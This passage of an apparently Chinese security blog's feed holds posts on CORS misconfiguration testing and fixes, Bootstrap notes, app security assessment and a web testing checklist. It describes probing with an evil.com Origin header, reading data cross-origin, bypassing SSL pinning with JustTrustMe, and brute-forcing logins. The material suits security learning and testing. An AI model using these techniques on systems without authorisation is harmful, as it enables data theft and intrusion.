    <link href="https://yinwc.github.io/2020/11/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3CORS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yinwc.github.io/2020/11/20/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3CORS%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-11-20T08:50:04.000Z</published>
    <updated>2023-01-28T09:55:33.170Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li><li><a href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95">测试方法</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">修复建议</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>CORS，即跨源资源共享（Cross-Origin Resource Sharing）。同源策略（Same OriginPolicy）要求不同源之间是无法通信的，而CORS则是放宽同源策略以通过浏览器实现网站之间通信的机制。</li><li>CORS全称为Cross-Origin Resource Sharing即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。<br>CORS漏洞则是利用CORS技术窃取用户敏感数据，CORS漏洞的成因是服务端配置的规则不当所导致的，服务器端没有配置Access-Control-Allow-Origin等字段</li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>1、获取用户数据<br>2、客户端缓存中毒：这种配置允许攻击者利用其他的漏洞，更改没有验证的字段，看是否正常回显。比如，一个应用返回数据报文头部中包含“X-User”这个字段，这个字段的值没有经过验证就直接输出到返回页面上，此时就可以结合XSS漏洞来利用。<br>3、服务端缓存中毒：利用CORS的错误配置注入HTTP头部，这可能会被服务器端缓存下来，比如制造存储型xss</p><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul><li>查看是否存在get请求的json形式敏感信息，在请求头中添加任意Origin值，如<a href="https://evil.xn--com%2C:access-control-allow-origin:https-p059do49bba822wts1ktzpa9z4nfj5jea//evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。">https://evil.com，查看返回头是否返回：Access-Control-Allow-Origin:https://evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。</a></li><li>CORS配置不当通常会导致的危害是用户敏感信息泄露，场景大多数是get请求方式返回的json形式的敏感信息（密钥、token，key等）。CORS配置不当属于响应头中的一种，其他还有X-Frame-Options、Content-Security-Policy等。漏洞利用成功的前提是，两个返回头必须为：Access-Control-Allow-Origin:<a href="https://evil.com/">https://evil.com</a><br>更改响应头Access-Control-Allow-Origin或Origin字段等，看返回头是否返回CORS配置字段</li></ul><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1、仔细评估是否开启CORS，如果不必要就不要开启CORS。<br>2、如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。<br>3、仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS。<br>4、要尽可能的返回”Vary: Origin”这个头部，以避免攻击者利用浏览器缓存。<br>5、如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。<br>6、限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。<br>7、限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。<br>8、仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://cloud.tencent.com/developer/article/1516490">CORS配置不当—挖掘技巧及实战案例全汇总</a><br><a href="https://xz.aliyun.com/t/2745">cors安全完全指南</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3&quot;&gt;漏洞危</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>前端框架之Bootstrap学习</title>
    <link href="https://yinwc.github.io/2020/10/13/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%B9%8BBootstrap%E5%AD%A6%E4%B9%A0/"/>
    <id>https://yinwc.github.io/2020/10/13/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%B9%8BBootstrap%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-13T08:43:02.000Z</published>
    <updated>2023-01-28T08:49:22.068Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%8E%92%E7%89%88">排版</a><ul><li><a href="#bootstrap%E6%A6%82%E8%BF%B0">Bootstrap概述</a><ul><li><a href="#%E7%89%B9%E6%80%A7">特性</a></li><li><a href="#%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6">包含文件</a></li></ul></li><li><a href="#bootstrap%E6%8E%92%E7%89%88html%E5%85%83%E7%B4%A0%E7%9A%84%E6%A0%B7%E5%BC%8F%E9%87%8D%E5%AE%9A%E4%B9%89">Bootstrap排版——HTML元素的样式重定义</a></li><li><a href="#bootstrap%E8%A1%A8%E6%A0%BC">Bootstrap表格</a></li><li><a href="#bootstrap%E8%A1%A8%E5%8D%95">Bootstrap表单</a></li><li><a href="#bootstrap%E5%9B%BE%E5%83%8F">Bootstrap图像</a></li><li><a href="#bootstrap%E6%A0%85%E6%A0%BC%E7%B3%BB%E7%BB%9F">Bootstrap栅格系统</a></li><li><a href="#bootstrap%E8%BE%85%E5%8A%A9%E7%B1%BB">Bootstrap辅助类</a></li></ul></li><li><a href="#%E7%BB%84%E4%BB%B6">组件</a><ul><li><a href="#bootstrap%E5%9B%BE%E6%A0%87">Bootstrap图标</a></li></ul></li><li><a href="#js%E6%8F%92%E4%BB%B6">js插件</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><p><a href="https://www.jianshu.com/p/32f0761261b7">标签 name&#x3D;”viewport” 详解</a></p><h1 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h1><h2 id="Bootstrap概述"><a href="#Bootstrap概述" class="headerlink" title="Bootstrap概述"></a><a href="https://www.cnblogs.com/xiaohuochai/p/7052394.html">Bootstrap概述</a></h2><p>　　在前端世界，有个叫Bootstrap的家伙，，是twitter 开源出来的一套前端框架，利用Ta可以快速开发网站界面，它的特点就是比自己从头写简单，直观，方便，快捷，省劲。</p><p>　　凡是使用过Bootstrap的开发者，都不在乎做这么两件事情：复制and粘贴。哈哈~，是的使用Bootstrap非常简单，但是在复制粘贴之前，需要先对Bootstrap的用法一一熟悉之后我们才开始干活！</p><p>　　Bootstrap，来自 Twitter，是目前最受欢迎的前端框架。Bootstrap是基于HTML，CSS，JavaScript的前端框架，它简洁灵活，使得Web开发更加快捷。它由Twitter的设计师Mark Otto 和 Jacob Thornton 合作开发，是一个CSS &#x2F; HTML 框架。Bootstrap提供了优雅的 HTML 和CSS规范，它是由动态的CSS语言Less写成的。</p><p> <strong>它用于开发响应式布局、移动设备优先的 WEB 项目。</strong></p><p>　我们去bootcdn （<a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a> ）。会发现Bootstrap是星最多的前端框架之一。</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>响应式设计</li><li>栅格布局</li><li>完整的类库</li><li>jQuery插件</li><li>不同的使用场景</li></ul><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><p> Bootstrap 提供了两种形式的压缩包，在下载下来的压缩包内可以看到以下目录和文件，这些文件按照类别放到了不同的目录内，并且提供了压缩与未压缩两种版本。</p><ul><li>【预编译版】</li></ul><p>　　下载压缩包之后，将其解压缩到任意目录即可看到以下（压缩版的）目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bootstrap/</span><br><span class="line">├── css/</span><br><span class="line">│   ├── bootstrap.css</span><br><span class="line">│   ├── bootstrap.css.map</span><br><span class="line">│   ├── bootstrap.min.css</span><br><span class="line">│   ├── bootstrap.min.css.map</span><br><span class="line">│   ├── bootstrap-theme.css</span><br><span class="line">│   ├── bootstrap-theme.css.map</span><br><span class="line">│   ├── bootstrap-theme.min.css</span><br><span class="line">│   └── bootstrap-theme.min.css.map</span><br><span class="line">├── js/</span><br><span class="line">│   ├── bootstrap.js</span><br><span class="line">│   └── bootstrap.min.js</span><br><span class="line">└── fonts/</span><br><span class="line">    ├── glyphicons-halflings-regular.eot</span><br><span class="line">    ├── glyphicons-halflings-regular.svg</span><br><span class="line">    ├── glyphicons-halflings-regular.ttf</span><br><span class="line">    ├── glyphicons-halflings-regular.woff</span><br><span class="line">    └── glyphicons-halflings-regular.woff2</span><br></pre></td></tr></table></figure><p> 上面展示的就是 Bootstrap 的基本文件结构：预编译文件可以直接使用到任何 web 项目中。提供了编译好的 CSS 和 JS (<code>bootstrap.*</code>) 文件，还有经过压缩的 CSS 和 JS (<code>bootstrap.min.*</code>) 文件。同时还提供了 CSS <a href="https://developer.chrome.com/devtools/docs/css-preprocessors">源码映射表</a> (<code>bootstrap.*.map</code>) ，可以在某些浏览器的开发工具中使用。同时还包含了来自 Glyphicons 的图标字体，在附带的 Bootstrap 主题中使用到了这些图标。</p><h2 id="Bootstrap排版——HTML元素的样式重定义"><a href="#Bootstrap排版——HTML元素的样式重定义" class="headerlink" title="Bootstrap排版——HTML元素的样式重定义"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7052397.html">Bootstrap排版——HTML元素的样式重定义</a></h2><h2 id="Bootstrap表格"><a href="#Bootstrap表格" class="headerlink" title="Bootstrap表格"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7068080.html">Bootstrap表格</a></h2><h2 id="Bootstrap表单"><a href="#Bootstrap表单" class="headerlink" title="Bootstrap表单"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7068087.html">Bootstrap表单</a></h2><h2 id="Bootstrap图像"><a href="#Bootstrap图像" class="headerlink" title="Bootstrap图像"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7101315.html">Bootstrap图像</a></h2><h2 id="Bootstrap栅格系统"><a href="#Bootstrap栅格系统" class="headerlink" title="Bootstrap栅格系统"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7101637.html">Bootstrap栅格系统</a></h2><h2 id="Bootstrap辅助类"><a href="#Bootstrap辅助类" class="headerlink" title="Bootstrap辅助类"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7074864.html">Bootstrap辅助类</a></h2><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h2 id="Bootstrap图标"><a href="#Bootstrap图标" class="headerlink" title="Bootstrap图标"></a><a href="http://www.cnblogs.com/xiaohuochai/p/7101618.html">Bootstrap图标</a></h2><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7106649.html">Bootstrap下拉菜单</a></p><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7107129.html">Bootstrap按钮组</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7109350.html">Bootstrap按钮式下拉菜单</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7110728.html">Bootstrap输入框组</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7111581.html">Bootstrap导航</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7112631.html">Bootstrap导航条</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7113583.html">Bootstrap分页</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7113645.html">Bootstrap提示信息(标签、徽章、巨幕和页头)</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7119963.html">Bootstrap缩略图</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7120087.html">Bootstrap警告框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7122236.html">Bootstrap进度条</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7122564.html">Bootstrap媒体对象</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7123212.html">Bootstrap列表组</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7123548.html">Bootstrap面板</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7123822.html">Bootstrap洼地</a></p><h1 id="js插件"><a href="#js插件" class="headerlink" title="js插件"></a>js插件</h1><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7128599.html">Bootstrap插件概述</a></p><p>##　<a href="http://www.cnblogs.com/xiaohuochai/p/7130390.html">Bootstrap模态弹出框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7136678.html">Bootstrap滚动监控器</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7144028.html">Bootstrap选项卡</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7147288.html">Bootstrap提示框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7153121.html">Bootstrap弹出框</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7154682.html">Bootstrap按钮插件</a> </p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7155093.html">Bootstrap手风琴效果</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7156038.html">Bootstrap图片轮播</a></p><p>##　　<a href="http://www.cnblogs.com/xiaohuochai/p/7156551.html">Bootstrap自动定位浮标</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.cnblogs.com/xiaohuochai/p/7097376.html">Bootstrap学习记录</a></p><p><a href="https://www.cnblogs.com/wj-1314/p/9551426.html">https://www.cnblogs.com/wj-1314/p/9551426.html</a></p><p>补充：</p><p>前端框架layui</p><ul><li>安装<br>官方网址：<a href="http://www.layui.com/">http://www.layui.com/</a></li></ul><p>GIT：<a href="https://github.com/sentsin/layui/">https://github.com/sentsin/layui/</a></p><ul><li>官网下载后，会有一个压缩包<br>layui.all.js 包含了所有模块的js 速度慢<br>layui.js 速度快 使用时需要倒入</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%8E%92%E7%89%88&quot;&gt;排版&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#bootstrap%E6%A6%82%E8%BF%B0&quot;&gt;Bootstrap概述&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="安全开发" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>App安全评估思路总结</title>
    <link href="https://yinwc.github.io/2020/09/09/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>https://yinwc.github.io/2020/09/09/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</id>
    <published>2020-09-09T08:36:19.000Z</published>
    <updated>2023-02-02T07:03:59.415Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90">安全威胁分析</a></li><li><a href="#app%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E5%A4%A7%E6%A6%82%E5%88%86%E7%B1%BB">APP安全评估大概分类</a></li><li><a href="#%E4%BD%BF%E7%94%A8burp%E6%8A%93%E5%8F%96%E6%89%8B%E6%9C%BAapp%E7%9A%84%E5%8C%85%E6%89%8B%E6%9C%BA%E6%97%A0%E9%9C%80root">使用Burp抓取手机app的包（手机无需root）</a></li><li><a href="#app%E5%9C%A8%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95">app在什么情况下无法抓包（无法进行安全测试）</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="安全威胁分析"><a href="#安全威胁分析" class="headerlink" title="安全威胁分析"></a>安全威胁分析</h2><p>app面临的威胁主要来自这三方面</p><p><img src="/2020/09/09/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1.png" alt="app安全测试"></p><p><strong>客户端：</strong></p><ul><li>反编译</li><li>调试</li><li>加密&#x2F;签名破解</li><li>输入记录</li><li>导出组件</li><li>进程注入</li></ul><p><strong>数据传输：</strong></p><ul><li>信息泄露</li><li>传输数据篡改</li><li>重放攻击</li></ul><p><strong>服务端</strong></p><ul><li>心血</li><li>ST2</li><li>注入</li><li>跨站</li><li>越权执行</li><li>上传下载</li><li>弱口令</li></ul><h2 id="APP安全评估大概分类"><a href="#APP安全评估大概分类" class="headerlink" title="APP安全评估大概分类"></a>APP安全评估大概分类</h2><p>1、从数据的本地存储到数据的传输、处理以及远程访问等各个环节，基于相应的安全标准&#x2F;行业标准评估APP的安全特性</p><p>2、借鉴在Web App和网络安全测试的一些成功经验在智能终端APP测试中进行测试或适配</p><p>3、检测APP的用户授权级别，数据泄露，非法授权访问等；</p><p>4、对APP的输入有效性校验、认证、授权、敏感数据存储、数据加密等方面进行检测，以发现潜在的安全问题</p><p>5、基于各种通信协议或相应的行业安全标准检查app是否满足相应的要求。</p><h2 id="使用Burp抓取手机app的包（手机无需root）"><a href="#使用Burp抓取手机app的包（手机无需root）" class="headerlink" title="使用Burp抓取手机app的包（手机无需root）"></a>使用Burp抓取手机app的包（手机无需root）</h2><p>使用VirtualXposed抓包：<a href="https://testerhome.com/articles/18609">https://testerhome.com/articles/18609</a> 然后将burp证书倒入进手机，设置代理抓包即可：</p><ul><li><p>1、手机安装VirtualXposed</p><p>下载地址：<a href="https://github.com/android-hacker/VirtualXposed/releases">https://github.com/android-hacker/VirtualXposed/releases</a></p></li><li><p>2、VirtualXposed中安装 JustTrustMe 或 SSLUnpinning 用于绕过 SSL 证书检查</p><ul><li>JustTrustMe：<a href="https://github.com/Fuzion24/JustTrustMe/releases">https://github.com/Fuzion24/JustTrustMe/releases</a></li><li>SSLUnpinning：<a href="https://github.com/ac-pm/SSLUnpinning_Xposed/blob/master/mobi.acpm.sslunpinning_latest.apk">https://github.com/ac-pm/SSLUnpinning_Xposed/blob/master/mobi.acpm.sslunpinning_latest.apk</a> 在VirtualXposed中安装apk并启用模块 并在设置中，点击重启以使模块生效</li><li>配置Burp代理<br><img src="/2020/09/09/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/2.png" alt="app安全测试"></li><li>然后在真机中的WLAN中配置好对应的代理，Burp即可抓到VirtualXposed中的包</li></ul></li></ul><h2 id="app在什么情况下无法抓包（无法进行安全测试）"><a href="#app在什么情况下无法抓包（无法进行安全测试）" class="headerlink" title="app在什么情况下无法抓包（无法进行安全测试）"></a>app在什么情况下无法抓包（无法进行安全测试）</h2><ul><li>一是APP截取的数据报文处于加密状态，在无法解密的情况下无法对数据包进行安全测试</li><li>二是基于各类SSL的安全配置导致数据包无法抓取</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/shuryuu/article/details/103084983">移动安全app渗透测试要点</a></p><p><a href="http://blog.nsfocus.net/mobile-app-security-security-test/">绿盟：移动APP安全测试要点</a></p><p><a href="https://www.anquanke.com/post/id/211562">H5页面漏洞挖掘之路-加密篇</a></p><p><a href="https://misakikata.github.io/2020/04/APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/">APP应用安全检测</a></p><p><a href="https://github.com/Brucetg/App_Security">https://github.com/Brucetg/App_Security</a></p><p><a href="https://wizardforcel.gitbooks.io/lpad/content/">Android渗透测试学习手册</a><br><a href="https://www.mrwu.red/wp-content/uploads/2019/01/2d64e44287506e29af96.pdf">Android+APP渗透测试方法大全</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90&quot;&gt;安全威胁分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#app%E5%AE%89%E5%85%A8</summary>
      
    
    
    
    
    <category term="安全评估" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>安全测试之我见</title>
    <link href="https://yinwc.github.io/2020/08/18/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%88%91%E8%A7%81/"/>
    <id>https://yinwc.github.io/2020/08/18/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%88%91%E8%A7%81/</id>
    <published>2020-08-18T08:28:45.000Z</published>
    <updated>2023-02-20T05:48:13.387Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95">业务安全测试</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8A%9F%E8%83%BD%E7%82%B9">漏洞功能点</a><ul><li><a href="#%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E5%A4%84">登录认证处</a></li><li><a href="#%E6%90%9C%E7%B4%A2%E5%A4%84">搜索处</a></li><li><a href="#%E7%95%99%E8%A8%80%E5%A4%84">留言处</a></li><li><a href="#%E5%88%A0%E9%99%A4%E5%A4%84">删除处</a></li><li><a href="#%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E5%A4%84">修改密码处</a></li><li><a href="#%E4%BF%AE%E6%94%B9%E4%BF%A1%E6%81%AF%E5%A4%84">修改信息处</a></li><li><a href="#%E8%AE%A2%E5%8D%95%E5%A4%84">订单处</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%A4%84">文件下载处</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%84">文件上传处</a></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B">漏洞类型</a><ul><li><a href="#java">java</a><ul><li><a href="#shiro">shiro</a><ul><li><a href="#shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Eshiro-550">shiro rememberMe反序列化漏洞（Shiro-550）</a></li><li><a href="#shiro-padding-oracle-attackshiro-721">shiro Padding Oracle Attack（Shiro-721）</a></li></ul></li></ul></li><li><a href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a><ul><li><a href="#%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2">登录界面</a></li><li><a href="#%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87">图形验证码绕过</a></li><li><a href="#%E7%9F%AD%E4%BF%A1%E7%B1%BB%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87">短信类验证码绕过</a></li></ul></li><li><a href="#sql%E6%B3%A8%E5%85%A5">sql注入</a></li><li><a href="#xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">xss跨站脚本攻击</a></li><li><a href="#csrf%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">csrf跨站请求伪造</a></li><li><a href="#ssrf%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">ssrf服务器端请求伪造</a></li><li><a href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E">越权漏洞</a><ul><li><a href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83">水平越权</a></li><li><a href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83">垂直越权</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">文件上传漏洞</a></li><li><a href="#cors%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E">cors跨域资源共享漏洞</a></li><li><a href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E">弱口令漏洞</a></li><li><a href="#url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E">URL跳转漏洞</a></li><li><a href="#%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8">短信轰炸</a></li></ul></li><li><a href="#%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0">学习文章</a></li><li><a href="#%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95">问题记录</a><ul><li><a href="#token%E6%9C%AA%E5%8F%8A%E6%97%B6%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95">token未及时失效问题记录</a></li><li><a href="#xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D">XSS漏洞的修复</a></li></ul></li><li><a href="#others">Others</a></li></ul><!-- /TOC --><h1 id="业务安全测试"><a href="#业务安全测试" class="headerlink" title="业务安全测试"></a>业务安全测试</h1><p><img src="/2020/08/18/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%88%91%E8%A7%81/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%85%B3%E9%94%AE%E7%82%B9.jpg" alt="安全测试之我见"></p><h1 id="漏洞功能点"><a href="#漏洞功能点" class="headerlink" title="漏洞功能点"></a>漏洞功能点</h1><h2 id="登录认证处"><a href="#登录认证处" class="headerlink" title="登录认证处"></a>登录认证处</h2><ul><li><p>暴力破解</p><ul><li>测试方法<br>常常使用 Bp 结合字典对账号密码进行暴力破解</li><li>小技巧：<br><code>intercept is on</code>关闭的时候浏览器的请求依然会经过 Bp 只是不被拦截，所有的请求可以在 history 中查看</li><li>修复建议</li></ul><p>1.设置登录验证码，并在尝试登录后改变，同时验证码的强度不能过低，防止攻击者使用 OCR 识别<br>2.设置登录失败次数限制，相同用户五分钟内失败6次则三小时内禁止登录<br>3.可增加手机短信校验等辅助校验方式</p></li><li><p>本地加密传输测试</p><ul><li>测试方法<br>(1)首先查看是否使用了 SSL(HTTPS)，如果没有使用 SSL 的话，使用 Bp 获登录数据包，查看是否存在明文传输<br>(2)如果是使用了 SSL 可以使用 wireshark 抓包看一下是不是真的加密了</li></ul></li></ul><h2 id="搜索处"><a href="#搜索处" class="headerlink" title="搜索处"></a>搜索处</h2><p>1、SQL注入<br>2、XSS<br>3、SSRF</p><h2 id="留言处"><a href="#留言处" class="headerlink" title="留言处"></a>留言处</h2><p>1、XSS<br>2、SSRF<br>3、越权</p><h2 id="删除处"><a href="#删除处" class="headerlink" title="删除处"></a>删除处</h2><p>1、CSRF<br>2、SSRF</p><h2 id="修改密码处"><a href="#修改密码处" class="headerlink" title="修改密码处"></a>修改密码处</h2><p>1、CSRF<br>2、越权</p><h2 id="修改信息处"><a href="#修改信息处" class="headerlink" title="修改信息处"></a>修改信息处</h2><p>1、CSRF<br>2、越权</p><h2 id="订单处"><a href="#订单处" class="headerlink" title="订单处"></a>订单处</h2><p>1、越权</p><ul><li>遍历订单信息、修改操作</li></ul><p>2、CSRF</p><h2 id="文件下载处"><a href="#文件下载处" class="headerlink" title="文件下载处"></a>文件下载处</h2><ul><li>任意文件下载 <ul><li>eg：<a 